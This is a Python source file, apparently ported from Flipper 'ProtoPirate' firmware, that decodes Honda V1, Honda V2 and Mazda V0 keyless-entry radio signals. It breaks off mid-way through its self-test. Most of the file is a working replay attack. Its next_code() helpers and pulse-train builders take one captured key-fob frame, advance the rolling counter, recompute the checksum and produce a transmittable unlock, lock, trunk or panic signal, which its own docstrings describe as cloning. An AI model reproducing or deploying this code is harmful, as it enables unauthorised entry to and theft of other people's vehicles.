#!/usr/bin/env python3
r"""pp_honda_mazda.py -- three plaintext (no-secret-key) Flipper Sub-GHz keyless
entry decoders ported bit-for-bit from ProtoPirate FoxEdition C to pure Python:

    * Honda V1  (honda_v1.c)  -- OOK/AM, merged-Manchester at te 1000/2000us.
                                 Key = serial(28b) + button high-nibble + a fixed
                                 per-button 16-bit code + 16b counter. A separate
                                 4-bit wire CRC nibble (crc_fold / checksum_base /
                                 checksum_alternate) is transmitted twice.
    * Honda V2  (honda_v2.c)  -- FSK/FM, hand-rolled Manchester at te 250/500us.
                                 Key = 24b command signature + 24b serial + 9b
                                 counter + 3b linear "check" + a parity "tail".
    * Mazda V0  (mazda_v0.c)  -- OOK/FM, toolbox Manchester at te 250/500us,
                                 sync byte 0xD7 / tail 0x5A, air bytes inverted,
                                 nibble-interleave whitening keyed on checksum
                                 parity.

All three carry serial + counter + button + a self-check, with NO cryptographic
secret, so a captured frame both clones and predicts the next rolling code by
simply incrementing the counter and recomputing the check -- the *_next_code()
helpers do exactly that.

Because there is no secret, "bit-exactness" here means the CRC/checksum maths, the
per-button code tables and the on-wire bit layout must match the firmware exactly;
those are what this port reproduces and what the self-test verifies by round-
tripping encode -> (build the same pulse train the C encoder builds) -> decode.

Shared primitives (Const, ProtoDecoder, Manchester, diff, byte<->u64) come from
arke_core, matching the arke_renault.py port style.
"""

from arke_core import (
    Const,
    ProtoDecoder,
    Manchester,
    diff,
    u64_to_bytes_be,
    bytes_to_u64_be,
    MASK64,
)

MASK16 = 0xFFFF


# ============================================================================
# shared helper -- blocks/math.c subghz_protocol_blocks_parity8
# ============================================================================
def parity8(byte):
    """XOR-parity of the 8 bits of a byte -> 0/1 (== firmware parity8)."""
    byte &= 0xFF
    byte ^= byte >> 4
    byte &= 0xF
    return (0x6996 >> byte) & 1


def _merge_stream(upload):
    """Collapse consecutive same-level (level, dur) entries -- this is what an OOK/
    FSK receiver actually sees over the air (one edge per level change), so feeding
    the merged stream faithfully models the on-device demodulator input."""
    out = []
    for lvl, dur in upload:
        if out and out[-1][0] == lvl:
            out[-1][1] += dur
        else:
            out.append([lvl, dur])
    return [(lvl, dur) for lvl, dur in out]


def _drive(decoder, upload):
    """Feed a built pulse train (list of (level, dur_us)) into a decoder."""
    for lvl, dur in _merge_stream(upload):
        decoder.feed(lvl, dur)


# ============================================================================
# HONDA V1
# ============================================================================
HONDA_V1_BIT_COUNT = 68
HONDA_V1_TE_SHORT = 1000
HONDA_V1_TE_LONG = 2000
HONDA_V1_TE_DELTA = 400
HONDA_V1_TE_SHORT_MIN = 600
HONDA_V1_TE_END = 3500
HONDA_V1_VALID_MAX = 0x4B
HONDA_V1_SERIAL_MASK = 0x0FFFFFFF
HONDA_V1_COUNTER_MASK = 0xFFFF
HONDA_V1_NIBBLE = 0x0F
HONDA_V1_BUTTON_MAX = 10
HONDA_V1_BUTTON_VALID_MASK = 0x701  # bits 0 (Unlock), 8 (Lock), 9 (Trunk), 10 (Panic)
HONDA_V1_BUTTON_FALLBACK_CODE = 0x00088888
HONDA_V1_PREAMBLE_UPLOAD_COUNT = 180
HONDA_V1_FRAME_SYMBOLS = 80
HONDA_V1_FRAME_START = 12
HONDA_V1_FRAME_SYNC_DROP = 2
HONDA_V1_FRAME_REPEAT_PER_CRC = 2
HONDA_V1_FRAME_GAP_US = 5000

# Fixed per-button code table (honda_v1.c honda_v1_button_codes), transcribed:
HONDA_V1_BUTTON_CODES = {
    0: 0x00080808,   # Unlock
    8: 0x00088888,   # Lock
    9: 0x00099190,   # Trunk
    10: 0x000FA7A0,  # Panic
}
HONDA_V1_BUTTON_NAMES = {0: "Unlock", 8: "Lock", 9: "Trunk", 10: "Panic"}


def honda_v1_button_valid(b):
    if b > HONDA_V1_BUTTON_MAX:
        return False
    return ((HONDA_V1_BUTTON_VALID_MASK >> b) & 1) != 0


def honda_v1_button_name(b):
    return HONDA_V1_BUTTON_NAMES.get(b, "Unknown")


def honda_v1_button_code(button):
    if not honda_v1_button_valid(button):
        return HONDA_V1_BUTTON_FALLBACK_CODE
    return HONDA_V1_BUTTON_CODES[button]


def honda_v1_crc_fold(v):
    """honda_v1_crc_fold: 4-bit fold of a value (v is <=16 bits)."""
    v &= 0xFFFF
    lo = v & HONDA_V1_NIBBLE
    hi = v >> 4
    s = lo if (hi & 1) else -lo
    out = (s - hi) & 7
    out |= ((v >> 3) & 1) << 3
    if ((v >> 1) & 1) and (((v >> 4) ^ (v >> 5)) & 1):
        out ^= 0x04
    return out & HONDA_V1_NIBBLE


def honda_v1_checksum_base(data):
    a = honda_v1_crc_fold(data & HONDA_V1_COUNTER_MASK)          # low 16b = counter
    b = honda_v1_crc_fold((data >> 40) & 0xFF)                   # byte @ bits 40..47
    return (a ^ b ^ 1) & HONDA_V1_NIBBLE


def honda_v1_checksum_alternate(checksum):
    mask = 0x09
    if (checksum & 1) == 0:
        mask = 0x0B if (checksum & 2) else 0x0F
    return (checksum ^ mask) & HONDA_V1_NIBBLE


def honda_v1_checksum_wire_order(data):
    """Returns (first, second) 4-bit CRC nibbles in the order transmitted."""
    checksum = honda_v1_checksum_base(data)
    other = honda_v1_checksum_alternate(checksum)
    if checksum & 0x08:
        return other, checksum
    return checksum, other


def honda_v1_crc_valid(data, crc):
    first, second = honda_v1_checksum_wire_order(data)
    crc &= HONDA_V1_NIBBLE
    return crc == first or crc == second


def honda_v1_encode(serial, button, counter):
    """Pure encoder == honda_v1_build_key(): 64-bit key, bit-for-bit with the C.

    Layout (big-endian): [serial:28][btn_hi_nibble:4][code_lo16:16][counter:16].
    (The 4-bit wire CRC is NOT part of the key -- see honda_v1_crc_pair.)"""
    table = honda_v1_button_code(button)
    low = ((table & HONDA_V1_COUNTER_MASK) << 16) | (counter & HONDA_V1_COUNTER_MASK)
    high = ((serial & HONDA_V1_SERIAL_MASK) << 4) | (table >> 16)
    return ((high << 32) | low) & MASK64


def honda_v1_crc_pair(key):
    """The two 4-bit CRC nibbles (first, second) transmitted for this key."""
    return honda_v1_checksum_wire_order(key)


def honda_v1_decode_fields(data):
    low = data & 0xFFFFFFFF
    serial = (data >> 36) & HONDA_V1_SERIAL_MASK
    btn = (low >> 28) & HONDA_V1_NIBBLE
    cnt = low & HONDA_V1_COUNTER_MASK
    return serial, btn, cnt


# ---- Honda V1 encoder pulse builder (mirrors honda_v1_append_frame/build_upload)
def _honda_v1_emit_merge(gen, level, us):
    if gen and gen[-1][0] == level:
        gen[-1][1] += us
    else:
        gen.append([level, us])


def _honda_v1_append_frame(frame, upload):
    gen = []
    for bit_index in range(HONDA_V1_FRAME_SYMBOLS):
        if bit_index >= HONDA_V1_FRAME_START:
            data_index = (bit_index - HONDA_V1_FRAME_START) >> 3
            shift = (11 - bit_index) & 0x07
            bit = (frame[data_index] >> shift) & 1
        else:
            bit = (~bit_index) & 1
        _honda_v1_emit_merge(gen, bit != 0, HONDA_V1_TE_SHORT)
        _honda_v1_emit_merge(gen, bit == 0, HONDA_V1_TE_SHORT)

    if len(gen) <= HONDA_V1_FRAME_SYNC_DROP:
        return False
    copy = gen[HONDA_V1_FRAME_SYNC_DROP:]  # drop the sync pad
    upload.extend((lvl, dur) for lvl, dur in copy)

    tail_level = not upload[-1][0]
    upload.append((tail_level, HONDA_V1_TE_SHORT))
    if not tail_level:
        upload.append((True, HONDA_V1_TE_SHORT))
    upload.append((False, HONDA_V1_FRAME_GAP_US))
    return True


def _honda_v1_build_upload(key):
    upload = []
    for _ in range(HONDA_V1_PREAMBLE_UPLOAD_COUNT // 2):
        upload.append((True, HONDA_V1_TE_SHORT))
        upload.append((False, HONDA_V1_TE_SHORT))
    upload[-1] = (False, HONDA_V1_FRAME_GAP_US)

    frame = u64_to_bytes_be(key) + [0]  # 9 bytes, frame[8] holds crc<<4
    first, second = honda_v1_checksum_wire_order(key)
    for crc in (first, second):
        frame[8] = (crc << 4) & 0xFF
        for _ in range(HONDA_V1_FRAME_REPEAT_PER_CRC):
            _honda_v1_append_frame(frame, upload)
    return [(lvl, dur) for lvl, dur in upload]


def honda_v1_next_code(serial, button, counter):
    """Next valid frame (counter+1) for cloning."""
    nxt = (counter + 1) & HONDA_V1_COUNTER_MASK
    key = honda_v1_encode(serial, button, nxt)
    first, second = honda_v1_crc_pair(key)
    return {
        "proto": HondaV1.NAME, "serial": serial & HONDA_V1_SERIAL_MASK,
        "btn": button, "btn_name": honda_v1_button_name(button), "cnt": nxt,
        "key": key, "crc": first, "crc_first": first, "crc_second": second,
        "upload": _honda_v1_build_upload(key),
    }


class HondaV1(ProtoDecoder):
    NAME = "Honda V1"
    CONST = Const(HONDA_V1_TE_SHORT, HONDA_V1_TE_LONG, HONDA_V1_TE_DELTA, HONDA_V1_BIT_COUNT)

    # decoder steps
    _RESET, _PREAMBLE, _DATA = 0, 1, 2

    def __init__(self):
        super().__init__()
        self.pending = 0
        self.pending_valid = False
        self._state_reset()

    def reset(self):
        super().reset()
        self.pending = 0
        self.pending_valid = False
        self._state_reset()

    def _state_reset(self):
        self.step = self._RESET
        self.preamble_count = 0
        self.preamble_has_long = False
        self.data_pending = False
        self.last_level = False
        self.bit_count = 0
        self.bits = bytearray(12)

    @staticmethod
    def _dur_is(d, t):
        return diff(d, t) <= HONDA_V1_TE_DELTA

    def _add_bit(self, bit):
        if self.bit_count > HONDA_V1_VALID_MAX:
            return
        if bit:
            self.bits[self.bit_count >> 3] |= 1 << ((~self.bit_count) & 0x07)
        self.bit_count += 1

    def _commit(self):
        if self.bit_count < HONDA_V1_BIT_COUNT:
            return False
        aligned = bytearray(self.bits)
        shift_count = self.bit_count - HONDA_V1_BIT_COUNT
        if shift_count < 1:
            shift_count = 1
        n = len(aligned)
        for _ in range(shift_count):
            for i in range(n - 1):
                aligned[i] = ((aligned[i] << 1) | (aligned[i + 1] >> 7)) & 0xFF
            aligned[n - 1] = (aligned[n - 1] << 1) & 0xFF

        button = aligned[4] >> 4
        if not honda_v1_button_valid(button):
            return False

        data = bytes_to_u64_be(aligned[:8])
        # Genuine HondaV1 frames embed the fixed per-button code (bits 16-35 =
        # table>>16 | table&0xFFFF). The 4-bit CRC alone false-matches foreign
        # frames; require this ~16-bit invariant so a real Honda frame is proven.
        embedded_code = (((data >> 32) & 0xF) << 16) | ((data >> 16) & 0xFFFF)
        if embedded_code != honda_v1_button_code(button):
            return False
        k2 = aligned[8] >> 4
        serial, btn, cnt = honda_v1_decode_fields(data)
        crc_ok = honda_v1_crc_valid(data, k2)
        nxt = ncnt = None
        if crc_ok:
            try:
                r = honda_v1_next_code(serial, btn, cnt)
                nxt, ncnt = "0x%X" % r["key"], r["cnt"]
            except Exception:
                pass
        self.emit({
            "data": data, "key": data, "serial": serial, "btn": btn,
            "btn_name": honda_v1_button_name(btn), "cnt": cnt,
            "crc": k2, "crc_ok": crc_ok, "next": nxt, "next_cnt": ncnt,
        })
        return True

    def _symbol(self, level, duration):
        sh = self._dur_is(duration, HONDA_V1_TE_SHORT)
        lg = self._dur_is(duration, HONDA_V1_TE_LONG)

        if not sh and not lg:
            if (not level) and duration > HONDA_V1_TE_END and self.step == self._DATA:
                self._commit()
            self._state_reset()
            return

        if self.step == self._RESET:
            if level:
                self.step = self._PREAMBLE
                self.preamble_count = 1
                self.last_level = level
            return

        if self.step == self._PREAMBLE:
            if lg:
                if self.preamble_count < 0xFF:
                    self.preamble_count += 1
                self.preamble_has_long = True
                self.last_level = level
                return
            if sh:
                if self.preamble_has_long and self.preamble_count > 5:
                    self.step = self._DATA
                    self.bit_count = 0
                    self.bits = bytearray(12)
                    self.data_pending = True
                    self.last_level = level
                    return
                if self.preamble_count < 0xFF:
                    self.preamble_count += 1
                self.last_level = level
                return
            self._state_reset()
            return

        # step == DATA
        if sh:
            if self.data_pending:
                self._add_bit(level)
                self.data_pending = False
                self.last_level = level
                return
            self.data_pending = True
            self.last_level = level
        else:  # lg
            if self.data_pending:
                self._add_bit(level)
            else:
                self._add_bit(self.last_level)
            self.last_level = level

    def feed(self, level, duration):
        if duration < HONDA_V1_TE_DELTA:
            self.pending += duration
            self.pending_valid = True
            return
        if self.pending_valid:
            p = self.pending
            if level:
                self.pending = p + duration
                self.pending_valid = True
                return
            if p >= HONDA_V1_TE_SHORT_MIN:
                self._symbol(True, p)
            self.pending = 0
            self.pending_valid = False
        if level:
            self.pending = duration
            self.pending_valid = True
            return
        self._symbol(False, duration)


# ============================================================================
# HONDA V2
# ============================================================================
HONDA_V2_TE_SHORT = 250
HONDA_V2_TE_LONG = 500
HONDA_V2_TE_DELTA = 100
HONDA_V2_MIN_BITS = 81
HONDA_V2_SYNC_US = 750
HONDA_V2_SYNC_DELTA_US = 120
HONDA_V2_MIN_PREAMBLE_PAIRS = 64
HONDA_V2_PREAMBLE_PAIRS = 319
HONDA_V2_GAP_US = 50000

HONDA_V2_BTN_UNKNOWN = 0x00
HONDA_V2_BTN_LOCK = 0x02
HONDA_V2_BTN_UNLOCK = 0x04
# 24-bit command "signatures" -- opaque constants baked into the firmware; only
# these two are known, so V2 frames can only be built for Lock / Unlock.
HONDA_V2_SIG_UNLOCK = 0xA285E3
HONDA_V2_SIG_LOCK = 0xC20363


def honda_v2_button_from_signature(sig):
    if sig == HONDA_V2_SIG_UNLOCK:
        return HONDA_V2_BTN_UNLOCK
    if sig == HONDA_V2_SIG_LOCK:
        return HONDA_V2_BTN_LOCK
    return HONDA_V2_BTN_UNKNOWN


def honda_v2_signature_from_button(button):
    if button == HONDA_V2_BTN_LOCK:
        return HONDA_V2_SIG_LOCK
    if button == HONDA_V2_BTN_UNLOCK:
        return HONDA_V2_SIG_UNLOCK
    return 0


def honda_v2_button_name(button):
    if button == HONDA_V2_BTN_LOCK:
        return "Lock"
    if button == HONDA_V2_BTN_UNLOCK:
        return "Unlock"
    return "Unknown"


def honda_v2_calculate_check(count):
    """3-bit linear check over the counter bits (honda_v2_calculate_check)."""
    c0 = ((count >> 1) ^ (count >> 2) ^ (count >> 3) ^ (count >> 4) ^ (count >> 6)) & 1
    c1 = ((count >> 0) ^ (count >> 2) ^ (count >> 3) ^ (count >> 4) ^ (count >> 5) ^ (count >> 6) ^ 1) & 1
    c2 = ((count >> 1) ^ (count >> 3) ^ (count >> 4) ^ (count >> 5) ^ (count >> 6)) & 1
    return c0 | (c1 << 1) | (c2 << 2)


def honda_v2_calculate_tail_msb(count):
    return (((count >> 0) ^ (count >> 2) ^ (count >> 4) ^ (count >> 5)) & 1) != 0


def honda_v2_calculate_tail(count):
    return 0xFFFF if honda_v2_calculate_tail_msb(count) else 0x7FFF


def honda_v2_build_key(signature, serial, count):
    """Pure encoder == honda_v2_build_key(): deterministic 64-bit key.

    [sig:24][serial:24][count_hi:8][count_lsb:1][000:3][check:3]  (big-endian)."""
    kb = [0] * 8
    kb[0] = (signature >> 16) & 0xFF
    kb[1] = (signature >> 8) & 0xFF
    kb[2] = signature & 0xFF
    kb[3] = (serial >> 16) & 0xFF
    kb[4] = (serial >> 8) & 0xFF
    kb[5] = serial & 0xFF
    kb[6] = (count >> 1) & 0xFF
    counter_lsb = 0x80 if (count & 1) else 0x00
    kb[7] = counter_lsb | honda_v2_calculate_check(count)
    return bytes_to_u64_be(kb)


def honda_v2_parse_key_fields(key):
    kb = u64_to_bytes_be(key)
    sig = (kb[0] << 16) | (kb[1] << 8) | kb[2]
    sn = (kb[3] << 16) | (kb[4] << 8) | kb[5]
    cnt = (kb[6] << 1) | ((kb[7] >> 7) & 1)
    button = honda_v2_button_from_signature(sig)
    check = kb[7] & 0x07
    return sig, sn, cnt, button, check


def honda_v2_validate_frame(key, tail, extra_bit):
    kb = u64_to_bytes_be(key)
    count = (kb[6] << 1) | ((kb[7] >> 7) & 1)
    expected_check = honda_v2_calculate_check(count)
    expected_tail = honda_v2_calculate_tail(count)
    check_ok = ((kb[7] & 0x78) == 0) and ((kb[7] & 0x07) == expected_check)
    tail_ok = (tail == expected_tail) and bool(extra_bit)
    return check_ok, tail_ok


def honda_v2_next_code(signature, serial, count):
    """Next valid frame (count+1). signature must be a known Lock/Unlock sig."""
    nxt = (count + 1) & 0x1FF
    key = honda_v2_build_key(signature, serial, nxt)
    tail = honda_v2_calculate_tail(nxt)
    check = honda_v2_calculate_check(nxt)
    button = honda_v2_button_from_signature(signature)
    return {
        "proto": HondaV2.NAME, "sig": signature, "serial": serial & 0xFFFFFF,
        "btn": button, "btn_name": honda_v2_button_name(button), "cnt": nxt,
        "check": check, "tail": tail, "extra_bit": True, "key": key,
        "upload": _honda_v2_build_upload(key, nxt),
    }


# ---- Honda V2 encoder pulse builder (mirrors honda_v2_encoder_add_bit/build_upload)
def _honda_v2_add_bit(upload, prev_bit, bit):
    ts, tl = HONDA_V2_TE_SHORT, HONDA_V2_TE_LONG
    if (not prev_bit) and (not bit):
        upload.append((True, ts)); upload.append((False, ts))
    elif (not prev_bit) and bit:
        upload.append((True, tl))
    elif prev_bit and (not bit):
        upload.append((False, tl))
    else:
        upload.append((False, ts)); upload.append((True, ts))
    return bit


def _honda_v2_build_upload(key, count):
    upload = []
    kb = u64_to_bytes_be(key)
    for _ in range(HONDA_V2_PREAMBLE_PAIRS):
        upload.append((True, HONDA_V2_TE_SHORT))
        upload.append((False, HONDA_V2_TE_SHORT))
    upload.append((True, HONDA_V2_SYNC_US))
    upload.append((False, HONDA_V2_SYNC_US))
    upload.append((True, HONDA_V2_TE_SHORT))  # boundary pad

    prev = True
    prev = _honda_v2_add_bit(upload, prev, False)  # forced framing bit (key bit 1)
    for bit_index in range(2, 64):
        byte_index = bit_index // 8
        bit_in_byte = 7 - (bit_index % 8)
        bit = (kb[byte_index] >> bit_in_byte) & 1
        prev = _honda_v2_add_bit(upload, prev, bool(bit))

    tail = honda_v2_calculate_tail(count)
    for i in range(16):
        prev = _honda_v2_add_bit(upload, prev, bool((tail >> (15 - i)) & 1))
    prev = _honda_v2_add_bit(upload, prev, True)  # extra bit
    upload.append((False, HONDA_V2_GAP_US))
    return upload


class HondaV2(ProtoDecoder):
    NAME = "Honda V2"
    CONST = Const(HONDA_V2_TE_SHORT, HONDA_V2_TE_LONG, HONDA_V2_TE_DELTA, HONDA_V2_MIN_BITS)

    _RESET, _PRE_LOW, _PRE_HIGH, _SYNC_LOW, _DATA = 0, 1, 2, 3, 4

    def __init__(self):
        super().__init__()
        self.tail = 0
        self.key = 0
        self._reset_frame()
        self.parser_step = self._RESET
        self.preamble_count = 0

    def reset(self):
        super().reset()
        self.parser_step = self._RESET
        self.preamble_count = 0
        self._reset_frame()

    def _reset_frame(self):
        self.raw = bytearray(10)
        self.bit_count = 0
        self.extra_bit = False
        self.previous_bit = True
        self.boundary_pad_skipped = False
        self.pending_short = False

    @staticmethod
    def _is_short(d):
        return diff(d, HONDA_V2_TE_SHORT) < HONDA_V2_TE_DELTA

    @staticmethod
    def _is_long(d):
        return diff(d, HONDA_V2_TE_LONG) < HONDA_V2_TE_DELTA

    @staticmethod
    def _is_sync(d):
        return diff(d, HONDA_V2_SYNC_US) < HONDA_V2_SYNC_DELTA_US

    def _add_decoded_bit(self, bit):
        if self.bit_count < 80:
            byte_index = self.bit_count // 8
            bit_index = 7 - (self.bit_count % 8)
            if bit:
                self.raw[byte_index] |= 1 << bit_index
        elif self.bit_count == 80:
            self.extra_bit = bit
        else:
            return False
        self.bit_count += 1
        return True

    def _process_transition(self, level, duration):
        if not self.boundary_pad_skipped:
            if level and self._is_short(duration):
                self.boundary_pad_skipped = True
                return True
            self.boundary_pad_skipped = True

        if self.pending_short:
            if (not self.previous_bit) and (not level) and self._is_short(duration):
                self.pending_short = False
                return self._add_decoded_bit(False)
            if self.previous_bit and level and self._is_short(duration):
                self.pending_short = False
                return self._add_decoded_bit(True)
            return False

        if not self.previous_bit:
            if level and self._is_long(duration):
                self.previous_bit = True
                return self._add_decoded_bit(True)
            if level and self._is_short(duration):
                self.pending_short = True
                return True
            return False

        if (not level) and self._is_long(duration):
            self.previous_bit = False
            return self._add_decoded_bit(False)
        if (not level) and self._is_short(duration):
            self.pending_short = True
            return True
        return False

    def _finish_frame(self):
        key = bytes_to_u64_be(self.raw[:8])
        tail = (self.raw[8] << 8) | self.raw[9]
        check_ok, tail_ok = honda_v2_validate_frame(key, tail, self.extra_bit)
        if not (check_ok and tail_ok):
            return False
        self.key = key
        self.tail = tail
        sig, sn, cnt, button, check = honda_v2_parse_key_fields(key)
        nxt = ncnt = None
        if check_ok and tail_ok:
            try:
                r = honda_v2_next_code(sig, sn, cnt)
                nxt, ncnt = "0x%X" % r["key"], r["cnt"]
            except Exception:
                pass
        self.emit({
            "data": key, "key": key, "serial": sn, "btn": button,
            "btn_name": honda_v2_button_name(button), "cnt": cnt,
            "sig": sig, "check": check, "tail": tail,
            "check_ok": check_ok, "tail_ok": tail_ok,
            "crc_ok": check_ok and tail_ok, "next": nxt, "next_cnt": ncnt,
        })
        return True

    def feed(self, level, duration):
        st = self.parser_step
        if st == self._RESET:
            if level and self._is_short(duration):
                self.preamble_count = 0
                self.parser_step = self._PRE_LOW
        elif st == self._PRE_LOW:
            if (not level) and self._is_short(duration):
                self.preamble_count += 1
                self.parser_step = self._PRE_HIGH
            else:
                self.parser_step = self._RESET
        elif st == self._PRE_HIGH:
            if level and self._is_short(duration):
                self.parser_step = self._PRE_LOW
            elif level and self._is_sync(duration) and self.preamble_count >= HONDA_V2_MIN_PREAMBLE_PAIRS:
                self.parser_step = self._SYNC_LOW
            else:
                self.parser_step = self._RESET
        elif st == self._SYNC_LOW:
            if (not level) and self._is_sync(duration):
                self._reset_frame()
                self._add_decoded_bit(True)
                self.parser_step = self._DATA
            else:
                self.parser_step = self._RESET
        elif st == self._DATA:
            if not self._process_transition(level, duration):
                self.parser_step = self._RESET
            else:
                if self.bit_count == HONDA_V2_MIN_BITS:
                    self._finish_frame()
                    self.parser_step = self._RESET


# ============================================================================
# MAZDA V0
# ============================================================================
MAZDA_V0_TE_SHORT = 250
MAZDA_V0_TE_LONG = 500
MAZDA_V0_TE_DELTA = 100
MAZDA_V0_MIN_BITS = 64
MAZDA_V0_TOL = MAZDA_V0_TE_DELTA + 20  # 120us, the firmware manchester tolerance
MAZDA_V0_GAP_US = 0xCB20
MAZDA_V0_SYNC_BYTE = 0xD7
MAZDA_V0_TAIL_BYTE = 0x5A
MAZDA_V0_PREAMBLE_ONES = 16

MAZDA_V0_BUTTON_NAMES = {0x01: "Lock", 0x02: "Unlock", 0x04: "Trunk", 0x08: "Remote"}

# manchester event codes (toolbox manchester_decoder.h)
_M_SHORT_LOW, _M_SHORT_HIGH, _M_LONG_LOW, _M_LONG_HIGH, _M_RESET = 0, 2, 4, 6, 8


def mazda_v0_get_button_name(button):
    return MAZDA_V0_BUTTON_NAMES.get(button, "??")


def mazda_v0_calculate_checksum(serial, button, counter):
    counter &= 0xFFFFF
    return (((serial >> 24) & 0xFF) + ((serial >> 16) & 0xFF) + ((serial >> 8) & 0xFF)
            + (serial & 0xFF) + ((counter >> 8) & 0xFF) + (counter & 0xFF)
            + ((((counter >> 16) & 0x0F) | ((button & 0x0F) << 4)) & 0xFF)) & 0xFF


def mazda_v0_encode(serial, button, counter):
    """Pure encoder == mazda_v0_encode_key(): 64-bit key incl. checksum + the
    checksum-parity-keyed nibble-interleave whitening, bit-for-bit with the C."""
    counter &= 0xFFFFF
    button &= 0x0F
    data = [0] * 8
    data[0] = (serial >> 24) & 0xFF
    data[1] = (serial >> 16) & 0xFF
    data[2] = (serial >> 8) & 0xFF
    data[3] = serial & 0xFF
    data[4] = ((button << 4) | ((counter >> 16) & 0x0F)) & 0xFF
    data[5] = (counter >> 8) & 0xFF
    data[6] = counter & 0xFF
    data[7] = mazda_v0_calculate_checksum(serial, button, counter)

    stored_5 = (data[6] & 0x55) | (data[5] & 0xAA)
    stored_6 = (data[6] & 0xAA) | (data[5] & 0x55)
    xor_mask = stored_5 ^ stored_6
    replace_second = parity8(data[7]) == 0
    forward_mask = stored_5 if replace_second else stored_6

    data[5] = stored_5 if replace_second else xor_mask
    data[6] = xor_mask if replace_second else stored_6
    for i in range(5):
        data[i] ^= forward_mask
    return bytes_to_u64_be(data)


def mazda_v0_decode_key(data64):
    """Inverse of mazda_v0_encode -> (serial, button, counter, raw_checksum_byte)."""
    data = u64_to_bytes_be(data64)
    parity = parity8(data[7]) != 0
    limit = 6 if parity else 5
    mask = data[limit]
    for i in range(limit):
        data[i] ^= mask
    if not parity:
        data[6] ^= mask
    counter_lo = (data[5] & 0x55) | (data[6] & 0xAA)
    counter_mid = (data[6] & 0x55) | (data[5] & 0xAA)
    serial = (data[0] << 24) | (data[1] << 16) | (data[2] << 8) | data[3]
    btn = (data[4] >> 4) & 0x0F
    cnt = ((data[4] & 0x0F) << 16) | (counter_mid << 8) | counter_lo
    raw_crc = data64 & 0xFF
    return serial, btn, cnt, raw_crc


def mazda_v0_next_code(serial, button, counter):
    """Next valid frame (counter+1) for cloning."""
    nxt = (counter + 1) & 0xFFFFF
    key = mazda_v0_encode(serial, button, nxt)
    chk = mazda_v0_calculate_checksum(serial, button, nxt)
    return {
        "proto": MazdaV0.NAME, "serial": serial, "btn": button & 0x0F,
        "btn_name": mazda_v0_get_button_name(button & 0x0F), "cnt": nxt,
        "crc": chk, "key": key, "upload": _mazda_v0_build_upload(key),
    }


# ---- Mazda V0 encoder pulse builder (mirrors mazda_v0_build_upload) ----------
def _mazda_v0_append_byte(upload, value, te):
    # pp_emit_byte_manchester: MSB first, each bit -> (bit, te)(!bit, te)
    for bit in range(7, -1, -1):
        bv = (value >> bit) & 1
        upload.append((bool(bv), te))
        upload.append((not bool(bv), te))


def _mazda_v0_build_upload(key):
    upload = []
    ts = MAZDA_V0_TE_SHORT
    for _ in range(12):
        _mazda_v0_append_byte(upload, 0xFF, ts)
    upload.append((False, MAZDA_V0_GAP_US))
    _mazda_v0_append_byte(upload, 0xFF, ts)
    _mazda_v0_append_byte(upload, 0xFF, ts)
    _mazda_v0_append_byte(upload, MAZDA_V0_SYNC_BYTE, ts)
    for bi in range(8):
        raw = (key >> (56 - bi * 8)) & 0xFF
        air = (~raw) & 0xFF  # data bytes are inverted on air
        _mazda_v0_append_byte(upload, air, ts)
    _mazda_v0_append_byte(upload, MAZDA_V0_TAIL_BYTE, ts)
    upload.append((False, MAZDA_V0_GAP_US))
    return upload


class MazdaV0(ProtoDecoder):
    NAME = "Mazda V0 (PP)"   # distinct from arke_mazda_gm's "Mazda V0"
    CONST = Const(MAZDA_V0_TE_SHORT, MAZDA_V0_TE_LONG, MAZDA_V0_TE_DELTA, MAZDA_V0_MIN_BITS)

    _RESET, _PREAMBLE, _DATA = 0, 5, 6

    def __init__(self):
        super().__init__()
        self.man = Manchester()
        self._full_reset()

    def reset(self):
        super().reset()
        self._full_reset()

    def _full_reset(self):
        self.parser_step = self._RESET
        self.decode_data = 0
        self.decode_count_bit = 0
        self.man.state = 0  # ManchesterStateStart1
        self.preamble_count = 0
        self.preamble_pattern = 0

    def _event(self, duration, level):
        if diff(duration, MAZDA_V0_TE_SHORT) < MAZDA_V0_TOL:
            return _M_SHORT_LOW if level else _M_SHORT_HIGH
        if diff(duration, MAZDA_V0_TE_LONG) < MAZDA_V0_TOL:
            return _M_LONG_LOW if level else _M_LONG_HIGH
        return None

    def feed(self, level, duration):
        st = self.parser_step
        if st == self._RESET:
            if level and diff(duration, MAZDA_V0_TE_SHORT) < MAZDA_V0_TOL:
                self.decode_data = 0
                self.decode_count_bit = 0
                self.parser_step = self._PREAMBLE
                self.man.state = 1  # ManchesterStateMid1
                self.preamble_count = 0
                self.preamble_pattern = 0
            return

        event = self._event(duration, level)
        if event is None:
            self.parser_step = self._RESET
            return
        data = self.man.advance(event)
        if data is None:
            return

        if st == self._PREAMBLE:
            self.preamble_pattern = ((self.preamble_pattern << 1) | (1 if data else 0)) & 0xFF
            if data:
                self.preamble_count += 1
            elif self.preamble_count <= MAZDA_V0_PREAMBLE_ONES - 1:
                self.preamble_count = 0
                self.preamble_pattern = 0
                return
            if (self.preamble_pattern == MAZDA_V0_SYNC_BYTE
                    and self.preamble_count > MAZDA_V0_PREAMBLE_ONES - 1):
                self.decode_data = 0
                self.decode_count_bit = 0
                self.parser_step = self._DATA
            return

        # st == DATA
        self.decode_data = ((self.decode_data << 1) | (1 if data else 0)) & MASK64
        self.decode_count_bit += 1
        if self.decode_count_bit == MAZDA_V0_MIN_BITS:
            key = (~self.decode_data) & MASK64
            serial, btn, cnt, raw_crc = mazda_v0_decode_key(key)
            calc = mazda_v0_calculate_checksum(serial, btn, cnt)
            if calc == raw_crc:
                nxt = ncnt = None
                try:
                    r = mazda_v0_next_code(serial, btn, cnt & 0xFFFFF)
                    nxt, ncnt = "0x%X" % r["key"], r["cnt"]
                except Exception:
                    pass
                self.emit({
                    "data": key, "key": key, "serial": serial, "btn": btn,
                    "btn_name": mazda_v0_get_button_name(btn),
                    "cnt": cnt & 0xFFFFF, "crc": raw_crc, "crc_ok": True,
                    "next": nxt, "next_cnt": ncnt,
                })
            self._full_reset()


ALL = [HondaV1, HondaV2, MazdaV0]


# ============================================================================
# SELF-TEST: encode -> build the same pulse train the C encoder builds -> decode
# ============================================================================
def _decode_one(cls, upload):
    dec = cls()
    _drive(dec, upload)
    return dec.results


def _test_honda_v1():
    ok = True
    serial = 0x0ABCDEF & HONDA_V1_SERIAL_MASK
    print("  [Honda V1] button code table:")
    for b in (0, 8, 9, 10):
        print("    %-6s btn=%2d code=0x%08X" % (honda_v1_button_name(b), b, HONDA_V1_BUTTON_CODES[b]))
    for button in (0, 8, 9, 10):
        for cnt in (0x0001, 0x1234, 0x8000, 0xFFFE, 0xFFFF):
            key = honda_v1_encode(serial, button, cnt)
            first, second = honda_v1_crc_pair(key)
